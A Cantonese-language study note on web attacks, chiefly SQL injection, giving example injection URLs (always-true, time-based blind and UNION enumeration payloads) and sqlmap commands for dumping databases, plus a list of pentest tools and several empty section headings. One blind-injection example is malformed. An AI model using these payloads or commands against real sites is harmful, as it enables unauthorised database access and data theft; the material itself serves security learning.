# WEB Security

係Web Security入面,主要就有幾種玩法

##  - SQL injection ##
一個駭客最愛的攻擊方法,原自於給用戶輸入的data field處理不當,而使用戶能直接存取database的漏洞
以一個URL為例:
> 
    http://www.insecure.com/login.php?usr=admin&pass=123
    
係呢一個URL入面,好明顯係為左將usr同pass既資料傳到SQL入面,再send比database以作認證,而當中既SQL語句亦好可能係咁:
   
>SELECT * FROM UserTable WHERE usr='admin' and pass=123;
    
咁既話,如果有人入左奇怪既URL input的話,例如:
> http://www.insecure.com/login.php?usr=admin&pass=123' or 1=1 --

咁樣既話,放入SQL既語句就變左以下:
>SELECT * FROM UserTable WHERE usr='admin' and pass=123' or 1=1 --;

係呢個情況之下,最終語句就會變左:
>SELECT * FROM UserTable WHERE True;

亦即使話,如果呢個係一個login system的話,咁呢個人兄唔洗username同password就可能進入你既系統

以上為簡單的proof of concept

SQL 分以下三大類:

 - Error Base SQL injection

基本SQL injection,不解釋

例子:
>http://abc.com?id=1'<--使URL報錯,從而得知SQL架構並控制
>http://abc.com?id=1' and 1=2-- <--破壞where條件,使其false
>http://abc.com?id=1' or 1=1-- <--破壞where條件,使其true

 - Blind Sql Injection

現時只有傻仔admin先會容許自己網站報錯比人睇,所以一般都會使用blind SQL Injection泥brute force整個database

例子:
> http://newspaper.com/items.php?id=2 and 1=2 <-- Content-base
> http://newspaper.com/items.php?id=2' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ; <-- timebase

 - UNION Base SQL injection

簡而言之,就係爆庫

例子如下:
> http://cba.com?id=1' and 1=2 UNION all select 1,2 <--測試columns數量
> 
> http://cba.com?id=1' and 1=2 UNION all select 1,database() <--找出database
> 
> http://cba.com?id=1' and 1=2 UNION all select 1,table_name from INFORMATION_SCHEMA.tables <--找出table

----------

##  - LDAP injection ##


----------

##  - XSS injection ##
 

----------

##  - Directory traversal ##
 

----------

##  - File Inclusion ##
 

----------

##  - Cookie posioning ##
 

----------

##  - Command Injection ##


----------


## 實用工具如下:

 1. cURL
簡單來說,就是以command line作為browser,再連接到人家的WEB server,用這個方法,不單止能制作小爬蟲,最重要的是,你可以隨意改動當中packet的資料,不論是header, data, cookies,所有value都可以隨便改動
而且,這個工具十分common,幾乎在所有的Linux distribution都已經build-in左,因此係所有工具都沒有安裝時,也可以直接使用
使用方法:
> 
    curl [options...] [url]
    normal using (google) : curl google.com
    Post method with data : curl -X POST google.com -d "{data field}:{data value}" 
    Bring Cookie : curl google.com -b "{cookies field}:{cookies value}"
    Bring Header : curl google.com -H "{Header field}:{Header value}"

 
 2. Burp Suite
 一個功能強大的web attack tool,基本上就係一隻由你控制既proxy,之要你將你隻bowser既proxy set去你個burp suite,你就可以隨意view入面既data,甚至可以隨意改傳輸中既data(當然啦,最強大既係,呢舊野唔只可以係你個bowser咁做,仲可以係人地既bowser咁做)
 
 3. SQLMap
 一個十分強大既自動化SQL injection tool,佢可以直接經由URL,直接測試此網頁能否進行SQL injection(當然..,前提係個URL做緊get request啦),亦都可以經由packet入面既data進行post request attack,成功後更可自動爆庫(這對於任何想要用blind sql injection既同志都係好消息呢)
 使用方法:
> 
    normal using (somesite) : sqlmap -u somesite.com?id=5
    using with packet text file : sqlmap -r packet.txt
    got all the database (if injectable): sqlmap -u somesite.com?id=5 --dbs
    got all the table (if injectable): sqlmap -u somesite.com?id=5 -D {DATABASE} --tables
    got all the columns (if injectable): sqlmap -u somesite.com?id=5 -D {DATABASE} -T {TABLE} --columns
    got all the data!!(if injectable): sqlmap -u somesite.com?id=5 -D {DATABASE} -T {TABLE} -C {columns1},{column2} --dump

 4. Dirb
 一個非常方便的directory traversal tools,而原理就十分簡單...就係buffer force attack,因此,佢同下面既hydra一樣,攻擊既強度,取決於條list既厚度
 
 5. Hydra
 一個出哂名既online password cracker, 簡單泥講,就係crack password十分強大(當然,呢個工具既強度取決於你本password dictionary既厚度),一般係Kali Linux都會build-in
 
 6. Nikto
 一個幾出名既Opensource web vulerbility scanner, 佢會幫手搵哂成個網站既漏洞,基本上就係一個純CLI既scanner,一般kali Linux都會build-in
 
 7. OWASP ZAP
 一個由OWASP整出泥既輕量web vulnerbility scanner,入面build-in一個web spider,同時有個還可以(其實唔太準)既vulnerbility scanner,有時輕輕一掃都可能會出到d有用既野,而且附帶GUI令你睇得更輕鬆,一般Kali Linux都會build-in
 
 9. OpenVAS
 係Nessus變成收錢版本之後,最強既"Opensource" web vulnerbility scanner就變左做係佢啦
 佢可以自動化咁睇哂成個網站有冇問題,而且有埋report list out所有野,很不錯的
 
9. WireShark 
一個packet  Sniffer,可以睇當中傳輸的packet,雖然唔係主力用係WEB,不過有時都會派上用場

10. Python
神器不解釋(最強萬用刀,加上pwn呢個神器可以遇神殺神,遇佛殺佛)

11. Google Chrome (Development console)
用泥view source十分好用,而且可以直接改當中既cookies,同埋data transfer既情況,可說是神器中的神器
